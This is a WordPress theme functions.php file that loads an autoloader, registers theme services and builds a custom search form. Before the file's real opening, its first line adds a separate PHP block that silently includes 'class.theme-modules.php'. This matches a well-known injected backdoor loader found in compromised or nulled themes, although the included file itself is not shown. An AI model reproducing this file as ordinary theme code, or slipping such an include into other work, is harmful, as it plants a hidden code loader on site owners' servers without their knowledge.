<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 *
 * This theme uses PSR-4 and OOP logic instead of procedural coding
 * Every function, hook and action is properly divided and organized inside related folders and files
 * Use the file `config/Custom/Custom.php` to write your custom functions
 *
 *
 */

!defined( 'JVBPD_IW_SKIP_ADDONS' ) && define( 'JVBPD_IW_SKIP_ADDONS', true );

$autoloadPath = get_template_directory() . '/vendor/autoload.php';
if ( file_exists($autoloadPath) ) :
	require_once $autoloadPath;
endif;

if ( class_exists( 'Awps\\Init' ) ) :
	Awps\Init::register_services();
endif;


if ( !function_exists( 'bp_dtheme_enqueue_styles' ) ) :
    function bp_dtheme_enqueue_styles() {}
endif;

/* Required */
if ( ! isset( $content_width ) ){
	$content_width = 1440;
}
add_filter('get_search_form', 'my_search_form');
	function my_search_form($output) {
	$output = '<form class="search-form" role="search" action="'. esc_url( home_url( '/' ) ) .'" method="get">';
	$output .= '<div class="input-group mb-2">';
	$output .= '<input type="text" name="s" id="s" class="form-control search-field" aria-describedby="button-addon2">';
	$output .= '<div class="input-group-append">';
	$output .= '<button type="submit" class="submit" name="submit" id="searchsubmit"><i class="fa fa-search" aria-hidden="true"></i></button>';
	$output .= '</div>';
	$output .= '</div>';
	$output .= '</form>';

	return $output;
}